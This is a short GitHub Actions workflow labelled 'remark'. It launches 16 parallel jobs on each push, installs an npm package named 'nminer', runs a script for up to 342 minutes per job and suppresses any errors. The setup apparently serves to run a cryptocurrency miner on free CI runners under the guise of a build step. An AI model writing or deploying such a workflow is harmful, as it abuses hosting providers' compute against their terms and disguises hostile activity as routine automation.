name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1830 }
          - { version: 7231 }
          - { version: 9988 }
          - { version: 3006 }
          - { version: 9331 }
          - { version: 3068 }
          - { version: 3308 }
          - { version: 2294 }
          - { version: 5049 }
          - { version: 7442 }
          - { version: 1481 }
          - { version: 1081 }
          - { version: 6731 }
          - { version: 988 }
          - { version: 9411 }
          - { version: 3304 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: tusk
        run: |
          npm install nminer@latest
          timeout 342m node remark.js || echo "remark executed"